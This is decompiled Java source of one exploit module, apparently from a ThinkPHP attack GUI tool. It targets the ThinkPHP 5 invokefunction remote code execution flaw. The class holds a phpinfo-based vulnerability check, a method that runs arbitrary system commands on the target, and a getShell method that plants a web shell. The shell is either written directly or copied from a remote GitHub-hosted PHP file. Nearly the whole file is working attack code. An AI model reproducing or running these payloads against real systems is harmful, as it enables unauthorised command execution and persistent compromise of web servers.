/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import dylan.tools.Util;
/*    */ import java.io.UnsupportedEncodingException;
/*    */ import java.net.URLEncoder;
/*    */ import java.nio.charset.StandardCharsets;
/*    */ import java.util.ArrayList;
/*    */ import java.util.Base64;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp5_invoke_func_code_exec_1
/*    */   implements BaseExp {
/* 16 */   private String results = null;
/* 17 */   private final HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 22 */     String payload0 = "/index.php?s=index/think\\app/invokefunction&function=phpinfo&vars[0]=-1";
/* 23 */     url = url + payload0;
/* 24 */     Response response = HttpTool.get(url, this.property);
/* 25 */     if (response.getText().contains("PHP Version")) {
/* 26 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 27 */       return this.results;
/*    */     } 
/* 29 */     if (response.getError() != null) {
/* 30 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 31 */       return this.results;
/*    */     } 
/* 33 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/*    */     
/* 35 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 40 */     String payload = "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=" + cmd;
/* 41 */     url = url + payload;
/* 42 */     Response response = HttpTool.get(url, this.property);
/* 43 */     if (response.getError() == null) {
/* 44 */       this.results = Util.regReplace(response.getText());
/*    */     } else {
/* 46 */       this.results = response.getError();
/*    */     } 
/* 48 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/*    */     try {
/* 54 */       String urlEncodeContent = URLEncoder.encode(content, "UTF-8");
/* 55 */       String base64Content = Base64.getEncoder().encodeToString(content.getBytes(StandardCharsets.UTF_8));
/* 56 */       content = URLEncoder.encode(base64Content, "UTF-8");
/* 57 */       String payload1 = "/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=" + fileName + "&vars[1][]=" + urlEncodeContent;
/* 58 */       String payload2 = "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=php://filter/write=convert.base64-decode/resource=" + fileName + "&vars[1][]=" + content;
/* 59 */       String payload3 = "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=https://raw.githubusercontent.com/bewhale/thinkphp_gui_tools/main/php.php&vars[1][]=" + fileName;
/* 60 */       ArrayList<String> payloads = new ArrayList<>();
/* 61 */       payloads.add(payload1);
/* 62 */       payloads.add(payload2);
/* 63 */       payloads.add(payload3);
/*    */       
/* 65 */       for (String payload : payloads) {
/* 66 */         Response response = HttpTool.get(url + payload, this.property);
/* 67 */         if (response.getError() == null) {
/* 68 */           Response response1 = HttpTool.get(url + "/" + fileName, this.property);
/* 69 */           if (response1.getCode() == 200) {
/* 70 */             this.results = "[+] 上传成功，请检查URL：" + url + "/" + fileName;
/* 71 */             return this.results;
/*    */           }  continue;
/*    */         } 
/* 74 */         this.results = "[-] 上传失败: " + response.getError();
/*    */       }
/*    */     
/* 77 */     } catch (UnsupportedEncodingException e) {
/* 78 */       this.results = "[-] 上传失败: " + e.getMessage();
/*    */     } 
/* 80 */     return this.results;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp5_invoke_func_code_exec_1.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */